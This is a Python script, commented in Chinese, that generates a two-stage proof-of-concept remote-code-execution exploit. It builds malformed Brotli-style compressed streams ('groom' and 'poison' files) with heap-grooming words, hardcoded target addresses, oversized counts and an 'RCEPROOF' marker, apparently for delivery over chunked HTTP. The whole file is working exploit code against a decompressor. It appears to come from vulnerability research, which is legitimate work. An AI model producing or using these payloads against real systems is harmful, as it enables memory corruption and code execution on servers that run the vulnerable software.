#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""生成 PoC 的完整两段流：stage one（23MB 主体）+ stage two（27/127 字节续流）。
与 gen_rce_variant.py 的区别：补上 rce_stage_two()，即 poc.py 在 HTTP chunk 2 里
发送的那一段。上次 OOB 补测只喂了 stage one，链是不完整的。
"""
import hashlib
import struct

GROOM_WORD = 0x0003000000030000
GROOM_COMMAND_BLOCK_EXTRA = 0xFFFFFF
GROOM_STAGED_POS = -1
GROOM_STAGE2_SIZE = 127

POISON_TARGET = 0x06E948A0
POISON_COMMAND_BLOCK_EXTRA = 0xFFBF10
POISON_STAGED_POS = 0x3FF74D0
POISON_STAGE2_SIZE = 27


class Bits:
    def __init__(self) -> None:
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value: int, count: int) -> None:
        for bit_index in range(count):
            self.value |= ((value >> bit_index) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def aligned(self, value: bytes) -> None:
        if self.used:
            raise ValueError("writer is not byte-aligned")
        self.data.extend(value)

    def finish(self) -> bytes:
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def one_symbol_tree(bits: Bits, alphabet_size: int, symbol: int) -> None:
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (alphabet_size - 1).bit_length())


def varlen_u8(bits: Bits, value: int) -> None:
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def generate_rce_stream(prefix: bytes, command_block_extra: int) -> bytes:
    if len(prefix) > 0x10000:
        raise ValueError("RCE prefix is too large")

    bits = Bits()
    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)

    if prefix:
        bits.put(0, 1)
        bits.put(0, 2)
        bits.put(len(prefix) - 1, 16)
        bits.put(1, 1)
        if bits.used:
            bits.put(0, 8 - bits.used)
        bits.aligned(prefix)

    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)
    varlen_u8(bits, 0)
    varlen_u8(bits, 1)
    one_symbol_tree(bits, 4, 0)
    one_symbol_tree(bits, 26, 25)
    if not 0 <= command_block_extra <= 0xFFFFFF:
        raise ValueError("command block extra must fit in 24 bits")
    bits.put(command_block_extra, 24)
    varlen_u8(bits, 0)
    bits.put(3, 6)
    bits.put(0, 2)
    varlen_u8(bits, 0)
    varlen_u8(bits, 0)
    one_symbol_tree(bits, 256, 0)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 400, 184)

    distance_extra = (len(prefix) + 32) // 8
    command_count = 1 << 24
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1

    group = Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)
    return bits.finish()


def rce_stage_two(pos: int, size: int) -> bytes:
    if size < 27:
        raise ValueError("RCE stage two must be at least 27 bytes")
    body = bytearray(size)
    body[7] = 8
    struct.pack_into("<i", body, 15, pos)
    struct.pack_into("<I", body, 19, 0x7FFFFFFF)
    struct.pack_into("<I", body, 23, 0x7FFFFFFF)
    return bytes(body)


def rce_stage_one(target: int, command_block_extra: int,
                  proof_payload: bytes | None = None) -> bytes:
    prefix = bytearray(1024)
    if proof_payload:
        if len(proof_payload) > 512:
            raise ValueError("RCE proof payload exceeds 512 bytes")
        prefix[: len(proof_payload)] = proof_payload

    pair = struct.pack("<QQ", target, target)
    start = 71 if not proof_payload else len(proof_payload) + (
        (7 - len(proof_payload)) % 16)
    for offset in range(start, len(prefix) - 15, 16):
        prefix[offset:offset + 16] = pair
    return generate_rce_stream(bytes(prefix), command_block_extra) + b"\x00" * 3


def main():
    fake_proof = b"RCEPROOF" + bytes([0x41 + (i % 26) for i in range(504)])

    groom = rce_stage_one(GROOM_WORD, GROOM_COMMAND_BLOCK_EXTRA) + \
        rce_stage_two(GROOM_STAGED_POS, GROOM_STAGE2_SIZE)
    poison = rce_stage_one(POISON_TARGET, POISON_COMMAND_BLOCK_EXTRA, fake_proof) + \
        rce_stage_two(POISON_STAGED_POS, POISON_STAGE2_SIZE)

    for name, data in (("groom_full.bro", groom), ("poison_full.bro", poison)):
        h = hashlib.sha256(data).hexdigest()
        with open(name, "wb") as f:
            f.write(data)
        print(name, "len=", len(data), "sha256=", h[:16], "...")


if __name__ == "__main__":
    main()
